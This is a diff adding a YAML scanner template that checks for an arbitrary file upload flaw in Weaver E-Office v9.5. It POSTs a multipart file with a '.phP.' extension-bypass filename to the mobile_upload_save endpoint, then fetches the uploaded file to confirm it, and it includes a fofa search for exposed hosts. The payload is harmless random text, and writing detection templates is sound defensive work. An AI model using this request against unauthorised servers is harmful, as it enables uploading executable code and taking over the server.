@@ -1,0 +1,50 @@
+id: eoffice-mobile-upload-save-fileupload
+
+info:
+  name: 泛微 E-Office v9.5 mobile_upload_save 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |-
+    weaver E-Office v9.5 file upload vulnerability official
+    fofa: app="泛微-EOffice"
+  reference:
+    - https://github.com/sunyixuan1228/cve/blob/main/weaver.md?ref=www.ctfiot.com
+    - https://www.ctfiot.com/116750.html
+    - https://www.e-office.cn/
+  tags: weaver,ecology,eoffice,fileupload
+  created: 2023/07/11
+
+set:
+  filename: randomLowercase(4)
+  randbody: randomLowercase(32)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitForm{{rboundary}}
+      body: |
+        ------WebKitForm{{rboundary}}
+        Content-Disposition: form-data; name="upload_quwan"; filename="{{filename}}.phP."
+        Content-Type: image/jpeg
+
+        {{randbody}}
+        ------WebKitForm{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+
+        ------WebKitForm{{rboundary}}--
+    expression: response.status == 200 && response.body.bcontains(bytes(filename + ".phP"))
+    output:
+      search: '"\",(?P<id>[0-9]{10}),\"".bsubmatch(response.body)'
+      id: search["id"]
+  r1:
+    request:
+      method: GET
+      path: /attachment/{{id}}/{{filename}}.phP
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+expression: r0() && r1()
